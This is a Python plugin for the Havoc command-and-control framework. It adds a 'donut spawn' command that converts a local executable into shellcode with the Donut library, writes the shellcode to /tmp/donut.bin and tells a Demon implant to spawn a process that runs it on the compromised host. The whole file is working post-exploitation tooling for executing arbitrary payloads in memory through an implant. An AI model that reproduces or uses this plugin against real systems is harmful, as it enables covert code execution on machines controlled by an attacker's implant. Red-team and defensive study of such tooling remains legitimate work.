#!/usr/bin/env python3
#
# Havoc C2 plugin for donut
# - Must have donut python library installed
# - Tested to run under Kali Linux with modified main branch Havoc
#    (if not merged, see )
# - Just assuming using x64 and default techniques for now

from havoc import Demon, RegisterCommand, RegisterModule
import donut
import os

# Ideally would just push shellcode binary without generating a local file
# but that is not how the 'shellcode spawn' is implemented.
TEMP_FILE="/tmp/donut.bin"

def spawn( demonID, *param ):
    TaskID : str = None
    demon : Demon = None
    demon = Demon(demonID)

    if len(param)<2:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "donut spawn requires a valid local executable file as parameter!")
        return False

    localExe=param[1]

    if not os.path.isfile(localExe):
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Not a valid file {}!".format(localExe))
        return False

    localParams=""
    if len(param)>2:
        localParams=" ".join(param[2:])

    try:
        shellcode = donut.create( file=localExe, params=localParams)
    except:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Error creating shellcode with donut!")
        return False

    try:
        with open(TEMP_FILE, 'wb') as outFile:
            outFile.write(shellcode)
    except:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Error writing shellcode to temporary file {}!".format(TEMP_FILE))
        return False

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "Generating donut'd shellcode and spawning")
    # technique, arch, path
    demon.ShellcodeSpawn(TaskID, "default", "x64", TEMP_FILE, b'')

    return TaskID

RegisterModule( "donut", "Automatic shellcode generation and execution using Donut", "", "", "", ""  )
RegisterCommand( spawn, "donut", "spawn", "Generate shellcode using Donut and spawn new process. Example: 'donut spawn something.exe param1 param2'", 0, "", "" )
